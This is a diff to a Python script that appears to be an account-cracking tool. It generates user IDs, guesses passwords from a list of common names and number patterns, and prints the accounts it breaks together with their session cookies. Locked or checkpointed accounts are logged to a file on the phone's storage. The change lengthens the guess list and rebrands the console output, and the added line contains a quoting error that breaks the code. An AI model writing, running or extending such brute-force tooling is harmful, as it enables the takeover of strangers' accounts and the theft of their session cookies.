@@ -226,7 +226,7 @@ def v3():
         print(50*'_')
         for guru in user:
             uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','708090','908070','free fire','freefire1234']
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345',bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','708090','908070','free fire','freefire1234']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
     print(' [♥] Crack process has been completed')
@@ -285,14 +285,14 @@ def rcrack1(uid,pwx,tl):
                 if 'LOCK' in res:
                     return 'LOCK'
                 else:
-                    print(f'  \r\033[1;92m  [PAJVEJ-OK👨‍💻] '+uid+' • '+ps+'\33[0;92m')
+                    print('\r\r\033[1;32m[SHANTO-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[COOKIES🌺] • \033[1;32m'+coki+  '  ''  \033[0;97m')
                     print(f'  \r\033[1;92m  [COOKIE] '+coki)
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[PARVEJ-CP❌] {uid}|{ps}")
+                print('\r\r\33[1;30m[SHANTO-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                 open('/sdcard/PARVEJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
